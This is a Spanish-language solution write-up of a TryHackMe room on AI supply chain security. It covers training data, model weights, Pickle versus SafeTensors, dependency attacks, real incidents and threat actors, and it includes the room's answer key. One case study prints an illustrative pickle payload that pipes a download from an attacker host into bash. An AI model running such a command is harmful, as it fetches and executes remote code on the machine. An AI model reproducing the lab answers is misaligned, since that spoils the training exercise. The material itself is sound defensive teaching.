# Understanding AI Supply Chains

| **Dificultad** | Medium |
| **Tipo** | Theory + Lab |
| **Slug** | `understanding-ai-supplychains` |
| **Link** | [TryHackMe](https://tryhackme.com/room/understanding-ai-supplychains) |
| **Sección** | AI Supply Chain Security (Section 4 of 5) |
| **Fuente** | [RAHULKATARA1/TryHackMe-AI-Security-Path](https://github.com/RAHULKATARA1/TryHackMe-AI-Security-Path) - `Section-4-AI-Supply-Chain-Security\01-understanding-ai-supply-chains\README.md` |
| **Componentes** | AI supply chain / datasets / model weights / Pickle / SafeTensors / dependency confusion / Ray |
| **Impacto** | Mapear la cadena de suministro de IA, sus componentes y los vectores de ataque (pesos, serialización, dependencias e infraestructura) |

---

**Contexto:** La cadena de suministro de IA es el pipeline completo de componentes, dependencias y servicios que intervienen en la construcción y despliegue de un sistema de IA - desde datos de entrenamiento crudos y pesos de modelos de terceros hasta la infraestructura cloud que sirve predicciones en producción. Igual que los ataques a cadenas de suministro de software que definieron los incidentes de SolarWinds y XZ Utils, **la cadena de suministro de IA es una superficie de ataque de alto valor y baja visibilidad**.

Esta room mapea cada eslabón de la cadena, explica por qué cada eslabón es un punto de compromiso potencial, e introduce los actores de amenaza, motivaciones e incidentes del mundo real que hacen esta categoría tan crítica.

**Lo que aprenderás:**
* La anatomía de extremo a extremo de una cadena de suministro de IA.
* Componentes clave: datasets, modelos pre-entrenados, frameworks ML, infraestructura de serving.
* Por qué las cadenas de suministro de IA son únicamente peligrosas comparadas con las cadenas de suministro de software tradicionales.
* Incidentes reales de cadenas de suministro de IA y sus consecuencias.
* Perfiles de actores de amenaza y motivaciones para atacar pipelines de IA.

---

## Solucionario

### Conceptos Clave / Key Concepts

#### La Cadena de Suministro de IA: Mapa de Extremo a Extremo

```
AI SUPPLY CHAIN

  [Data Sources]--->[Data Pipeline]--->[Pre-trained Models]
       |                  |                    |
  Web scrapes         ETL scripts          HuggingFace Hub
  Public datasets     Data labelling       PyPI packages
  Synthetic data      Feature stores       Model registries
                                              |
                              [Fine-tuning / Training]
                                              |
                              [Model Packaging & Registry]
                                              |
                              [Serving Infrastructure]
                                              |
                              [End User / Application]
```

**Cada flecha es un límite de confianza. Cada componente es un punto de compromiso potencial.**

#### Componente 1 - Datos de Entrenamiento

Los datos de entrenamiento son el **genoma** de un modelo. Lo que entra en los datos determina lo que el modelo aprende - incluyendo cualquier comportamiento malicioso horneado por un atacante.

**Fuentes de riesgo de datos de entrenamiento:**
- **Datasets web-scraped** (Common Crawl, LAION) - cualquiera puede influir en lo que se scrapea controlando contenido web.
- **Vendedores de datos de terceros** - procedencia opaca, sin pista de auditoría.
- **Plataformas de anotación abiertas** - los etiquetadores crowdsourced pueden insertar muestras mal etiquetadas o envenenadas.
- **Generadores de datos sintéticos** - si el generador en sí está comprometido, todos los datos generados están contaminados.

#### Componente 2 - Pesos de Modelos Pre-entrenados

La explosión del intercambio de modelos abiertos (Hugging Face, Ollama, Civitai) significa que la mayoría de las organizaciones construyen sobre **pesos pre-entrenados de terceros** en lugar de entrenar desde cero. Estos pesos son blobs binarios - **no hay un "equivalente de revisión de código fuente" para pesos de modelos**.

**Riesgos clave:**
- Los pesos pueden modificarse post-entrenamiento para incrustar backdoors.
- Los formatos de serialización de modelos (Pickle, SafeTensors, ONNX) pueden llevar **payloads ejecutables maliciosos**.
- La procedencia de los pesos casi nunca se verifica criptográficamente.

#### Componente 3 - Frameworks y Librerías ML

El ecosistema Python ML es vasto y débilmente gobernado:

| Riesgo del Ecosistema | Ejemplo |
|----------------|---------|
| **Typosquatting** | `torchvision` vs `torch-vision` - paquete malicioso con nombre similar |
| **Dependency confusion** | Nombre de paquete interno reclamado en PyPI público |
| **Mantenedor comprometido** | Ataque de cadena de suministro vía toma de cuenta de un paquete popular |
| **Dependencias transitivas** | 3 niveles de profundidad en `requirements.txt` - ¿conoces los 847 paquetes? |

#### Componente 4 - Infraestructura de Pipeline ML

La infraestructura de cómputo que ejecuta entrenamiento e inferencia es altamente privilegiada:
- Clusters de entrenamiento con acceso a petabytes de datos sensibles.
- Registros de modelos (MLflow, Weights & Biases, Neptune) que almacenan todas las versiones de modelos.
- Pipelines CI/CD que reentrenan y despliegan modelos automáticamente.
- **Un pipeline MLOps comprometido puede reentrenar y redesplegar silenciosamente un modelo con backdoor.**

#### Componente 5 - Infraestructura de Serving

La capa de inferencia de modelos enfrenta ataques web tradicionales **más** los específicos de IA:
- Imágenes de contenedor con malware incrustado.
- APIs de inferencia mal configuradas que exponen endpoints de admin.
- Instancias GPU con malware de cryptomining consumiendo cómputo caro.

#### Por Qué las Cadenas de Suministro de IA Son Únicamente Peligrosas

| Propiedad | Software Tradicional | Cadenas de Suministro de IA |
|----------|---------------------|-----------------|
| **Auditabilidad** | El código fuente es legible por humanos | Los pesos de modelo son binarios, opacos |
| **Procedencia** | Historial de Git, commits firmados | Casi ningún estándar equivalente |
| **Radio de explosión** | Afecta a usuarios de ese software | Afecta a todos los modelos fine-tuneados aguas abajo |
| **Detección** | Análisis estático, escáneres CVE | Sin herramientas equivalentes de escaneo de pesos |
| **Payload de exploit** | Código/binario | Datos, gradientes, triggers de backdoor |

### Task 1: Fundamentos de Cadena de Suministro / Supply Chain Fundamentals

**Explicación:**

En el ataque SolarWinds, el código malicioso se inyectó en el **build process** (proceso de compilación). Al instalar `torch`, pip también tira de `filelock`, que nunca se listó explícitamente: es una **transitive dependency**.

> **Nota:** La superficie de ataque más subestimada es el **registro de modelos**. En la mayoría de los flujos de trabajo MLOps, los modelos se promueven automáticamente de staging a producción basándose en el rendimiento de benchmarks - no en checks de seguridad. Un modelo con backdoor que rinde bien en benchmarks navegará directo a producción.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | In the SolarWinds attack, where in the supply chain was the malicious code injected? | `Build process` |
| 2 | While installing `torch` Pip also pulls in `filelock`, which you never listed. What type of dependency is `filelock`? | `transitive dependency` |

### Task 2: Componentes de la Cadena de Suministro de IA / AI Supply Chain Components

**Explicación:**

Los cuatro componentes clave de una cadena de suministro de IA (orden alfabético) son `Datasets, Dependencies, Frameworks, Models`. Los archivos de modelo contienen **serialised objects** (objetos serializados), lo que les permite ejecutar código al cargarse.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What are the four key components of an AI supply chain? (listed alphabetically) | `Datasets, Dependencies, Frameworks, Models` |
| 2 | What do model files contain that allows them to run code when loaded? | `serialised objects` |

### Task 3: Formatos de Modelo / Model Formats

**Explicación:**

El formato dominante para ejecutar LLMs locales como LLaMA, Mistral y Qwen es **gguf**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the dominant file format for running local large language models such as LLaMA, Mistral, and Qwen? | `gguf` |

### Task 4: Capas de Ataque / Attack Layers

**Explicación:**

Los ataques basados en Pickle ocurren en la **Model layer**. Convertir a SafeTensors elimina el ataque a nivel de **Serialisation-level**. Reemplazar el 0.1% de un dataset público con muestras diseñadas para introducir un backdoor representa el **Data Layer**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | At which layer of the AI supply chain do pickle-based attacks occur? | `Model layer` |
| 2 | Which level of model attack is eliminated by converting to SafeTensors format? | `Serialisation-level` |
| 3 | Researchers find that 0.1% of a public training dataset has been replaced with crafted samples designed to introduce a backdoor. Which attack layer does this represent? | `Data Layer` |

### Task 5: Ataques de Dependencia e Infraestructura / Dependency and Infrastructure Attacks

**Explicación:**

El paquete `torchtriton` explotó la resolución de versiones de pip para instalar un paquete público sobre uno interno: ataca la **Dependency Layer**. El atacante de `@solana/web3.js` robó las credenciales de un mantenedor para empujar actualizaciones maliciosas a un repositorio legítimo de alta confianza: representa la **Infrastructure Layer**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | The torchtriton package exploited pip's version resolution to install a public package over an internal one. Which of the four attack layers does this target? | `Dependency Layer` |
| 2 | The @solana/web3.js attacker stole a maintainer's credentials to push malicious updates to a legitimate, high-trust repository. Which attack layer does this represent? | `Infrastructure Layer` |

### Task 6: Lab Práctico / Practical Lab

**Explicación:**

En el sitio estático del lab, la organización no verificada que subió el modelo es `trustworthy-ai-models`; el modelo tiene **127** descargas (último mes); el modelo verificado `google-bert/bert-base-uncased` usa **SafeTensors** para sus pesos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | In the static site, what is the name of the unverified organisation that uploaded the model? | `trustworthy-ai-models` |
| 2 | How many downloads does this model have (last month)? | `127` |
| 3 | What file format does the verified model (google-bert/bert-base-uncased) use for its weights? | `SafeTensors` |

---

### Incidentes Reales de Cadena de Suministro de IA / Real-World AI Supply Chain Incidents

**Caso de Estudio 1 - El Incidente de Pickle Malicioso de Hugging Face (2023):**
Los investigadores descubrieron **más de 100 repositorios de modelos maliciosos** en Hugging Face que contenían modelos serializados con el formato Python Pickle. Los archivos Pickle pueden ejecutar código Python arbitrario en la deserialización - lo que significa que simplemente *descargar y cargar* el modelo era suficiente para comprometer la máquina de la víctima.

**Payload incrustado en el archivo `.pkl` malicioso:**
```python
# Pickle deserialization executes this automatically on load
import os
os.system("curl http://attacker.io/c2 | bash")
```

**Caso de Estudio 2 - Paquetes PyPI Envenenados Dirigidos a Ingenieros ML (2023):**
Múltiples campañas desplegaron paquetes con nombres como `torchserve-api`, `ml-utils-core` y `sklearn-extended` en PyPI. Cuando se instalaban (a menudo vía `pip install` desde un README o blog de tutorial), ejecutaban malware de robo de credenciales dirigido a claves AWS, tokens de Hugging Face y API keys de Weights & Biases.

**Caso de Estudio 3 - ShadowRay - RCE en Anyscale Ray Framework (2024):**
CVE-2023-48022 - Un RCE no autenticado crítico en el framework de entrenamiento ML distribuido Ray de Anyscale fue explotado activamente en la naturaleza. Los atacantes obtuvieron acceso a clusters de entrenamiento ML, exfiltraron pesos de modelos y desplegaron cryptominers en infraestructura GPU cara. Se estiman miles de clusters comprometidos.

---

### Perfiles de Actores de Amenaza / Threat Actor Profiles

| Actor de Amenaza | Motivación | Técnica Típica |
|-------------|------------|-------------------|
| **APTs de Estado-Nación** | Recolección de inteligencia, robo de PI, sabotaje de capacidades de IA del adversario | Acceso a largo plazo a infraestructura de entrenamiento; backdooring sutil de modelos |
| **Grupos Cibercriminales** | Ganancia financiera vía cryptomining en clusters GPU, robo de credenciales | Paquetes PyPI maliciosos, exploits de Pickle |
| **Competidores** | Espionaje corporativo, robo de modelos | Exfiltrar pesos de modelos propietarios |
| **Amenazas Internas** | Sabotaje, ganancia personal | Envenenar datos de entrenamiento, filtrar pesos |
| **Hacktivistas** | Sabotaje ideológico de sistemas de IA | Envenenamiento de datasets para causar sesgo o fallo del modelo |

---

### Conclusiones Personales / Personal Takeaways

* La seguridad de la cadena de suministro de IA es esencialmente **seguridad de cadena de suministro tradicional + 3 nuevas dimensiones**: pesos de modelos (artefactos binarios opacos), datos de entrenamiento (un medio de ataque completamente nuevo) e infraestructura específica de IA (clusters GPU, registros de modelos, pipelines MLOps).
* La **vulnerabilidad de Pickle** es un síntoma de un problema cultural más profundo: la comunidad ML se movió rápido y adoptó herramientas poderosas sin revisión de seguridad. El ecosistema está mejorando gradualmente (SafeTensors, model cards firmadas), pero millones de archivos `.pkl` existentes en la naturaleza siguen siendo peligrosos.
* El **modelo de confianza en ML está roto por defecto**. `pip install` + `model.load()` en un Jupyter notebook es como operan la mayoría de los data scientists - y ambos pasos pueden ejecutar silenciosamente código del atacante. La higiene de seguridad en flujos de trabajo ML está años atrás del mundo de seguridad de aplicaciones.
* Los ataques a cadenas de suministro de IA tienen un enorme **radio de explosión multiplicativo**. Un backdoor inyectado en un modelo pre-entrenado open-source popular (como un checkpoint temprano de un LLM popular) se propaga a cada organización que hace fine-tuning desde él - potencialmente miles de modelos aguas abajo.

---

**Metodología:**

1. Mapear la cadena de suministro de IA (datos → pipeline → modelos → fine-tuning → packaging/registry → serving → usuario final).
2. Identificar los cinco componentes de riesgo (datos de entrenamiento, pesos pre-entrenados, frameworks ML, infraestructura de pipeline y de serving).
3. Comprender los vectores de ataque por capa: Data Layer, Model Layer (Pickle), Dependency Layer e Infrastructure Layer.
4. Ver los incidentes reales (Hugging Face Pickle 2023, PyPI poisoned 2023, ShadowRay/Ray 2024) como ejemplos concretos.

**Learning chain:** AI supply chain map -> datasets -> model weights (opacos) -> frameworks ML -> pipeline/serving infra -> attack layers (Data/Model/Serialisation/Dependency/Infrastructure) -> Real incidents (Pickle, PyPI, ShadowRay)

**Lección:** *La cadena de suministro de IA multiplica los riesgos del software tradicional: pesos binarios no auditables, datos de entrenamiento como nuevo vector y pipelines MLOps privilegiados; Pickle es el ejemplo canónico de cómo un formato "conveniente" ejecuta código arbitrario al cargarse.*

**MITRE ATT&CK:** T1195 (Supply Chain Compromise) · T1195.001/002 (Compromise Software Dependencies / Tools) · T1195.003 · CWE-502 (Deserialization of Untrusted Data)

**Fuente:** [TryHackMe - Understanding AI Supply Chains](https://tryhackme.com/room/understanding-ai-supplychains)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
